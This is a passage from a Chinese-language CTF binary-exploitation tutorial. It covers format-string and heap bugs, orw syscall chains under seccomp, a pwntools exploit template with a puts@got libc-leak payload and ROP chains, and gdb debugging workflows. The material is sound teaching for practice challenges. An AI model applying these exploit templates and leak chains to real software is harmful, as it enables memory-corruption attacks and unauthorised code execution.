  于是栈上的内容（包括返回地址、canary、libc 地址）被逐个打印出来
        ↓
  这就是"任意读"（信息泄露）

输入 "%n" 时更狠：

  它会把"当前已经输出了多少个字符"写进你指定的地址！
        ↓
  配合 %p 先摸清位置 → 你就能"往任意地址写任意值"
        ↓
  这就是"任意写"，威力比栈溢出还大
```

| 攻击类型 | 需要的输入 | 能达成什么 |
|---|---|---|
| 栈溢出 | 超长输入 | 劫持返回地址 |
| 格式化字符串 `%p` | 短输入 | **读**任意内存（泄露 canary/libc/地址） |
| 格式化字符串 `%n` | 短输入 | **写**任意内存（改 GOT、改返回地址） |

**Heap 系列为什么"独立"？** 因为堆的内存管理（malloc/free 的记账结构）
是一套独立的机制。两个最核心的破坏方式：

| 漏洞 | 是什么意思 | 能干什么 |
|---|---|---|
| **堆溢出** | 往一个 chunk 写超长数据，踩坏隔壁 chunk 的元数据 | 控制下一次 malloc 返回的地址 |
| **UAF（Use-After-Free）** | 内存被 free 了，但指针还在，程序继续用 | 让新分配的 chunk 占用同一块内存，实现"两个指针指向同一块" |
| **Double Free** | 同一块内存 free 两次 | 破坏空闲链表，让 malloc 返回重复地址 |

**给你的学习顺序建议：**

```
① Stack Zero→Two        先体会"多写会踩坏东西"
② ROP Emporium 8 关      系统学 ROP（这就是本章 3 节）
③ Stack Three→Six        格式化字符串 + shellcode
④ Format Zero→Four       专项练格式化字符串
⑤ Heap Zero→Three        再碰堆
⑥ Net / Final            最后做综合
```

**别一上来就搞堆。** 堆的自由度大得多，元数据结构又抽象，
初学者在这里最容易"看得懂每个字但不知道在干嘛"。先把栈和 ROP 打扎实。

#### 4.5.1 六道入门题在考什么（零基础视角）

| 题目 | 表面在考 | 实际在教你 |
|---|---|---|
| `start` | 手写 shellcode | **输入空间极小**时如何两段式读取，以及 `read`/`write` 系统调用怎么用 |
| `orw` | open/read/write 链 | 当 `execve` 被 seccomp 封掉时，如何用三个系统调用把 flag 读出来 |
| `calc` | 栈溢出进阶 | 逻辑漏洞 + 数组越界也能变成控制流劫持，不只是"超长输入" |
| `fd` | 文件描述符 | `fd 0/1/2` 分别对应标准输入/输出/错误；**打开文件会得到 fd 3、4、5…** |
| `collision` | 哈希碰撞 | 不一定要"原值相等"，**哈希相等**就够了——逆向时要看校验的本质 |
| `bof` | 基础溢出 | 最简单的一次 ret 覆盖（32 位版，用来熟悉小端与偏移） |

**`fd` 那道题的原理值得单独说清**（它是初学者第一次遇到"概念题"）：

```
Linux 里每个打开的文件都用一个整数（文件描述符）代表：

  0 = stdin   （标准输入）
  1 = stdout  （标准输出）
  2 = stderr  （标准错误）
  3 = 第一个 fopen 打开的文件
  4 = 第二个 …

题目逻辑（概念版）：
  判断输入的数字 N，然后 read(N, buf, len)
        ↓
  你想让它 read 的是"flag 文件"对应的那个 fd
        ↓
  那就得让 flag 文件恰好是第 N 个被打开的文件 → N = 4 之类
```

**`orw` 的原理（为什么要有"orw 链"）：**

```
正常打法：  system("/bin/sh")  →  spawn 一个 shell → 读 flag
                                ↑
                       但这道题被 seccomp 拦住了：
                       execve 系统调用被禁 → shell 起不来

orw 打法：  绕过 shell，直接用系统调用自己读文件

   open("flag", O_RDONLY)   → 得到 fd
   read(fd, buf, 100)       → 内容读进内存
   write(1, buf, 100)       → 写到标准输出（= 打印到屏幕上）

  三个系统调用号（x86-64）：
     open  = 2       (需 RDI=路径, RSI=flags, RDX=mode)
     read  = 0       (需 RDI=fd, RSI=buf, RDX=count)
     write = 1       (需 RDI=1, RSI=buf, RDX=count)
```

> 一句话：**"被封了 shell，就自己当 shell。"** 这就是 orw 链的思想，
> 也是后面学 seccomp 绕过、纯 syscall ROP 的起点。

## 5. Pwn 通用解题模板

```python
#!/usr/bin/env python3
from pwn import *

# ---- 环境配置 ----
context(arch='amd64', os='linux', log_level='debug')
BINARY = './vuln'
elf = ELF(BINARY)
# libc = ELF('./libc.so.6')      # 需要时

def start():
    if args.REMOTE:
        return remote('TARGET', 1337)
    return process(BINARY)

io = start()

# ---- 步骤 1：泄露地址（如需要）----
# payload1 = b'A' * 40 + p64(elf.plt['puts']) + p64(elf.got['puts']) + p64(elf.symbols['main'])
# io.sendline(payload1)
# leaked = u64(io.recvline().strip().ljust(8, b'\x00'))
# libc_base = leaked - libc.symbols['puts']

# ---- 步骤 2：构造利用链 ----
OFFSET = 40
payload  = b'A' * OFFSET
payload += p64(...)              # ROP chain

io.sendlineafter(b'> ', payload)

# ---- 步骤 3：交互 ----

```

**常用常量与技巧**：

```python
p64(x)      # 打包 8 字节小端
p32(x)      # 打包 4 字节
u64(data)   # 解包 8 字节
b'A' * n    # 填充
flat([...]) # pwntools 的链式打包，自动处理
```

### 5.1 模板里三处"必须自己填"的地方

这个模板之所以是"模板"，是因为有三个空必须根据题目现场填。逐个说清怎么填：

**空一：`OFFSET` ——偏移量**

```
怎么得到：
  ① cyclic 生成模式串 → 打进程序 → 看崩溃的 RIP
  ② cyclic_find(崩溃地址) → 得到偏移
  ③ 或者 gdb 断在 ret 前，直接 x/8xg $rsp 看返回地址是自己的第几个字节

常见错误：
  ✘ 直接抄别人的 40/72（编译器选项不同，偏移就不同）
  ✘ 32 位题用 64 位的偏移（saved RBP 只占 4 字节）
```

**空二：泄露那一行 ——什么时候需要它**

```
需要泄露的条件（满足任意一个就要）：
  ① 有 PIE          → 程序自身地址不固定，得先知道基址
  ② 要调 libc 函数  → libc 地址不固定，得从 GOT 里读出来
  ③ 要写栈/堆地址   → 这些地址也随机

不需要泄露的条件：
  ✔ No PIE 且只用 @plt 里的现成函数（这就是 ROP Emporium 大部分关卡的情况）
```

**泄露链的读法（模板里那行注释是经典套路）：**

```python
payload1 = b'A' * 40 + p64(elf.plt['puts']) + p64(elf.got['puts']) + p64(elf.symbols['main'])
#           填充          调用 puts（它会打印一个参数）  参数=puts@got    返回 main 再来一轮
#                            ↑ 为什么用 puts？因为它"打印一个字符串"，正好用来把地址打出来
leaked = u64(io.recvline().strip().ljust(8, b'\x00'))
#                ↑ 去掉换行        ↑ 补足 8 字节（地址高字节常是 0x00 被截断）
libc_base = leaked - libc.symbols['puts']
#                        ↑ 泄露到的真实地址 - 它在 libc 里的偏移 = libc 基址
```

```
泄露链的内存推演：

  栈：  [ A * 40 ][ puts@plt ][ puts@got ][ main ]
                       │            │         │
                       │            │         └─ puts 返回后回到 main（再来一轮）
                       │            └─ 作为 RDI（puts 的第 1 个参数）
                       └─ 跳到 puts，它把 puts@got 处的 8 字节当"字符串"打印出来
                          → 屏幕上就出现了 libc 里 puts 的真实地址

  为什么要回到 main？
      因为一次交互不够——你还得用算出的基址发第二次 payload。
      回到 main 等于"程序重新开始，但我知道 libc 在哪了"。
```

**空三：ROP chain ——具体放什么 gadget**

```
填写顺序的通用格式（背下来）：

  填充
  + [设置 rdi 的 gadget] + [参数]
  + [设置 rsi 的 gadget] + [参数]
  + [设置 rdx 的 gadget] + [参数]
  + [要调用的函数地址]
  + [调用结束后回到哪（main / 下一个函数）]

  每一步的"参数放在 gadget 后面"是铁律——因为 gadget 执行时会"弹"栈上紧跟的值。
```

### 5.2 `flat()` 为什么好用（以及什么时候别用）

```python
# 手写拼装
payload = b'A' * 40 + p64(pop_rdi) + p64(0x601060) + p64(system)

# 用 flat
payload = flat([b'A' * 40, pop_rdi, 0x601060, system])
```

`flat()` 的好处是**自动按顺序打包、长度也想得周到**。但它也有个坑：

| 情况 | 建议 |
|---|---|
| 链条规整（一串 8 字节） | 用 `flat()`，清爽 |
| 中途要插原始字符串（如 `b"flag.txt"`） | 手写更清楚，或用 `flat({偏移: 数据})` 的字典写法 |
| 需要精确控制某个字节的位置 | 手写，别赌 `flat` 的行为 |

**调试建议：打印出来自己数一遍。**

```python
print(len(payload))          # 总长度对不对
print(hexdump(payload[:64])) # 前 64 字节长什么样，偏移对不对一眼看出
```

> **一条经验：payload 出问题，九成是"偏移差 8 字节"。**
> 养成习惯——每次改完 payload，先 `print(len(payload))` 和 `hexdump` 看一眼，
> 比 gdb 里来回试快得多。

## 7. 卡住了怎么办

| 现象 | 排查 |
|---|---|
| exploit 崩在奇怪地址 | 检查栈对齐，加一个 `ret` gadget 试试 |
| `cyclic_find` 返回 -1 | 偏移不对，确认架构（32/64 位） |
| 找不到 gadget | 换工具（ROPgadget / ropper / r2 `/R`），或考虑 ret2csu |
| gdb 里地址每次都变 | PIE/ASLR 开启，需要先泄露基址 |
| pwntools 报错找不到 libc | `apt install libc6-dbg`，或用 `libc-database` 查版本 |
| crackme 跑不起来 | 检查架构（`file`），可能需要 `chmod +x` |
| 远程 exploit 本地成功远程失败 | 栈环境差异，尝试验证 libc 版本、调整 offset |

### 7.1 把报错信息"翻译成人话"

初学者最痛苦的不是"崩了"，而是"看不懂它为什么崩"。这张表是**报错 → 病因**对照：

| 你看到的报错/现象 | 它在说什么 | 几乎总是这个原因 |
|---|---|---|
| `Segmentation fault (core dumped)` | 访问了非法地址 | 跳到不存在的地址（偏移错/地址错） |
| `*** stack smashing detected ***` | canary 被改了 | 溢出踩过了 canary，得先泄露它 |
| `*** buffer overflow detected ***` | FORTIFY 的检查触发了 | 用了 `_chk` 版本函数，换个入口 |
| `Illegal instruction (core dumped)` | 执行了无效指令 | 跳到了数据区，或地址偏了一位 |
| `munmap_chunk(): invalid pointer` | 堆的元数据乱了 | 堆溢出/UAF 破坏了 chunk 头 |
| `free(): double free detected` | 同一块内存免费了两次 | 典型 Double Free 场景 |
| `0x4141414141414141 in ?? ()` | 返回地址被 `'A'` 覆盖 | 偏移正好算对了，只是还没填真实地址 |
| `0x6161616161616166 in ?? ()` | 返回地址被模式串覆盖 | 还是 cyclic 阶段，正常 |
| `Inferior 1 exited normally` | 程序跑了但没进 shell | payload 没生效/输入没对上提示符 |
| `Cannot access memory at address 0x0` | 解引用了空指针 | 某个寄存器是 0，参数或 gadget 没设上 |
| `No such file or directory`（运行报错） | 找不到 ELF 解释器 | 缺动态库，或架构不对 |
| `ImportError: cannot import name 'pwn'` | pwntools 没装好 | 按官方指引重装 pwntools |

**"崩在 libc 里"是特殊信号（再强调一遍）：**

```
Program received signal SIGSEGV
0x00007ffff7e5cf34 in ?? () from /lib/x86_64-linux-gnu/libc.so.6
                       ↑ 栈回溯全是 ??

不是你的链写错了地址，而是"栈没对齐"。
解决：链首加一个 p64(RET) 试试（90% 的情况立刻好）
```

### 7.2 gdb 调试的系统化流程（照着做就不会瞎试）

很多初学者在 gdb 里是"乱敲命令、看到什么算什么"。给一个固定流程：

```
【准备】
  (gdb) set disassembly-flavor intel     ← 用 Intel 语法，比 AT&T 好读
  (gdb) checksec                          ← 先看保护（装了 pwndbg/peda 才有）
  (gdb) b *main+偏移                       ← 或者直接 b *地址
  (gdb) run < /tmp/payload                ← 也可以 run 之后再喂输入

【停下来后，按固定顺序看四样东西】
  ① 我跳到哪了   (gdb) info registers rip
  ② 栈顶是什么   (gdb) x/10xg $rsp
  ③ 关键寄存器   (gdb) info registers rdi rsi rdx rax rbp rsp
  ④ 那个地址对吗 (gdb) x/s 0x地址          ← 看字符串
                 (gdb) x/8xg 0x地址       ← 看 8 个 8 字节
                 (gdb) x/10i 0x地址       ← 反汇编 10 条指令（确认是不是函数入口）

【单步推进】
  (gdb) si            ← 进一条指令（会钻进 call）
  (gdb) ni            ← 过一条指令（不钻进去）
  (gdb) finish        ← 跑完当前函数
  (gdb) c             ← 继续跑

【观察栈是怎么被 ret 消费的（ROP 调链神器）】
  (gdb) x/20xg $rsp   ← 每次 si 之后敲一次，看 RSP 一格格往上走
```

**推荐装的 gdb 插件（能让调试舒服十倍）：**

| 插件 | 给你的东西 |
|---|---|
| **pwndbg** | `checksec`、`telescope`（把栈按"指针→目标"展开）、`rop` 搜索 |
| **peda** | 彩色反汇编、`pattern` 系列命令 |
| **gef** | 信息面板全、`heap` 相关命令强 |

装了之后，`telescope $rsp` 基本能替代一大串 `x/gx` 手工敲：

```
pwndbg> telescope $rsp 20
00:0000│ rsp 0x7fffffffe3a8 → 0x4007c3 (pop rdi ; ret)   ← 一眼看出链的走向
01:0008│     0x7fffffffe3b0 → 0x601060 ("/bin/cat flag.txt")
02:0010│     0x7fffffffe3b8 → 0x400560 (system@plt)
```

### 7.3 分层排查法：从"最可能"到"最不可能"

卡住时不要随机改 payload。按这个顺序排查，八成能在前三步解决：

```
第一层：地址对不对？（最常见，占一半以上）
   □ 目标函数的地址是入口吗？（用 x/10i 看是不是函数开头）
   □ 有没有抄错一位十六进制？
   □ No PIE 还是 PIE？（PIE 的话地址必然是错的）

第二层：偏移对不对？（第二常见）
   □ saved RBP 算进去了吗？（64 位 +8）
   □ 打印 payload 长度、hexdump 对照
   □ 断在 ret 前，直接看 RSP 指向的内容是不是自己填的

第三层：栈对齐对不对？
   □ 崩在 libc 内部 → 加一个 ret gadget
   □ 崩在 movaps 相关位置 → 同上

第四层：寄存器/gadget 对不对？
   □ 断在 gadget 执行前后，info registers 看值有没有进去
   □ 参数顺序（rdi → rsi → rdx）对不对？
   □ 寄存器被上个函数破坏了吗？（每组要重设）

第五层：环境差异
   □ 本地 libc 和远程 libc 版本一样吗？
   □ 远程的 flag 路径一样吗？
   □ 远程是否需要交互（/bin/sh 是否能拿到）？

第六层：保护没绕过
   □ canary 泄露了吗？
   □ RELRO 是 Full 吗？（GOT 改不了）
   □ 有没有 seccomp？（execve 被封就得走 orw）
```

### 7.4 概念对照总表（全章复习用）

把所有容易混的概念集中放一张表，考试前/复习时扫一遍：

| A | B | 核心区别 |
|---|---|---|
| **PLT** | **GOT** | PLT 是代码（跳板），GOT 是数据（地址簿） |
| **NX** | **Canary** | NX 拦"执行栈上代码"；Canary 拦"静默踩返回地址" |
| **PIE** | **ASLR** | PIE 是程序自身的编译选项；ASLR 是系统级随机化（PIE 依赖它生效） |
| **ROP** | **ret2libc** | ROP 是通用方法论；ret2libc 是"调库函数"这一具体用法 |
| **ret2csu** | **ret2libc** | ret2csu 解决"参数怎么设"；ret2libc 解决"调哪个函数" |
| **栈迁移** | **堆喷** | 迁移是"把 RSP 搬到已知地址"；堆喷是"盲猜地址并铺满" |
| **Partial RELRO** | **Full RELRO** | Partial 下 GOT 可写；Full 下 GOT 只读 |
| **RIP** | **RSP** | RIP 决定"执行哪条指令"；RSP 决定"从栈的哪个位置取指令" |
| **p32** | **p64** | 32 位打包 vs 64 位打包；用错就跳飞 |
| **栈溢出** | **格式化字符串** | 前者要超长输入；后者短输入即可任意读/写 |
| **UAF** | **Double Free** | UAF 是"释放后继续用"；Double Free 是"同一块释放两次" |
| **shellcode** | **ROP** | shellcode 是"自己写代码执行"；ROP 是"借用已有代码" |

### 7.5 常用工具速查

| 想干什么 | 命令 |
|---|---|
| 看文件类型/架构 | `file ./bin` |

| 看符号 | `rabin2 -s ./bin` |

| 谁调用了某函数 | r2 里 `axt @ sym.system` |
| 动态跑 + 看寄存器 | `gdb ./bin` → `info registers` |
